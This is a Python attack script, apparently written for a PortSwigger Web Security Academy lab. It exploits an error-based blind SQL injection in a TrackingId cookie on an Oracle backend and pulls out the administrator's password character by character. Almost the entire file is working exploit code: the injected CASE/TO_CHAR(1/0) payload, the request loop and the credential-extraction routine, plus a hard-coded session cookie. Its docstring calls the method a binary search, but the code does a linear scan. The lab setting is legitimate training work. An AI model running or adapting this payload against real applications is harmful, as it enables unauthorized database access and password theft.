#!/usr/bin/env python3
"""
oracle_blind_sqli_intruder.py
Blind SQL Injection (Oracle) - Binary Search Method
Author: Hasrat Afridi
"""

import requests
import urllib3
import sys
import time
import readline

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─────────────────────────────────────────
#   CONFIGURATION
# ─────────────────────────────────────────
URL         = "https://0ae3008903d3a4548027080f00ef00e0.web-security-academy.net/"
TRACKING_ID = "l6Kn7snuuKdQAEmk"
SESSION     = "E8znJRDSbJO0G345LhfFHE0uu6VQ7Bdv"
USERNAME    = "administrator"
PWD_LENGTH  = 20
CHARSET     = "0123456789abcdefghijklmnopqrstuvwxyz"

# ─────────────────────────────────────────
#   BANNER
# ─────────────────────────────────────────
def banner():
    print("""
╔══════════════════════════════════════════════╗
║   Oracle Blind SQLi - Binary Search          ║
║   Author : Hasrat Afridi                     ║
╚══════════════════════════════════════════════╝
    """)

# ─────────────────────────────────────────
#   CHARACTER CHECK (Oracle)
#   Position and char both dynamic
#   Cookie set as raw header - no encoding
# ─────────────────────────────────────────
def check_condition(position, test_char):
    """
    Payload: substr(password, POSITION, 1) = 'CHAR'
    TRUE  (500) -> exact character match
    FALSE (200) -> not this character
    """
    payload = (
        f"{TRACKING_ID}' and ("
        f"select case when substr(password,{position},1)='{test_char}' "
        f"then TO_CHAR(1/0) else 'x' end "
        f"from users where username='{USERNAME}'"
        f")='x'--"
    )

    # Raw header to prevent quote encoding
    headers = {
        "Cookie"    : f"TrackingId={payload}; session={SESSION}",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept"    : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

    try:
        r = requests.get(
            URL,
            headers=headers,
            verify=False,
            timeout=10,
            allow_redirects=True
        )
        return r.status_code == 500  # True means exact match

    except requests.exceptions.ConnectionError:
        print("\n  [!] Connection error - lab may have expired")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("\n  [!] Timeout - retrying...")
        time.sleep(2)
        return check_condition(position, test_char)

# ─────────────────────────────────────────
#   FIND ONE CHARACTER - linear scan
#   Try every char in CHARSET at given position
# ─────────────────────────────────────────
def find_char(position):
    """
    Try each character in CHARSET one by one
    500 response = exact match found
    """
    for char in CHARSET:
        if check_condition(position, char):
            return char

    print(f"\n  [!] No match found at position {position}")
    return None

# ─────────────────────────────────────────
#   MAIN CRACKING LOOP
# ─────────────────────────────────────────
def crack_password():
    print(f"\n[*] Starting password extraction ({PWD_LENGTH} characters)...")
    print(f"    Target   : {USERNAME}")
    print(f"    Charset  : {CHARSET}")
    print(f"    Method   : Exact match per position\n")

    password   = ""
    start_time = time.time()

    for position in range(1, PWD_LENGTH + 1):
        char = find_char(position)

        if char is None:
            print(f"\n  [!] Could not resolve character at position {position}")
            break

        password += char
        elapsed   = time.time() - start_time

        # Progress bar
        done    = "█" * position
        pending = "░" * (PWD_LENGTH - position)
        print(
            f"  [{done}{pending}] {position}/{PWD_LENGTH}"
            f"  char='{char}'  found={password}  ({elapsed:.1f}s)   ",
            end="\r"
        )

    print()
    return password

# ─────────────────────────────────────────
#   MAIN
# ─────────────────────────────────────────
def main():
    banner()

    print(f"""[*] Configuration:
    URL      : {URL}
    Username : {USERNAME}
    Tracking : {TRACKING_ID}
    Session  : {SESSION[:20]}...
    Length   : {PWD_LENGTH}
    Charset  : {CHARSET}
    """)

    confirm = input("[?] Start cracking? (y/n): ").strip().lower()
    if confirm != 'y':
        print("[!] Aborted.")
        sys.exit(0)

    try:
        password = crack_password()

        print(f"""
╔══════════════════════════════════════════╗
║           PASSWORD FOUND!                ║
╠══════════════════════════════════════════╣
║  Username : {USERNAME:<29}║
║  Password : {password:<29}║
╚══════════════════════════════════════════╝
        """)

    except KeyboardInterrupt:
        print("\n\n[!] Stopped by user.")
        sys.exit(0)

if __name__ == "__main__":
    main()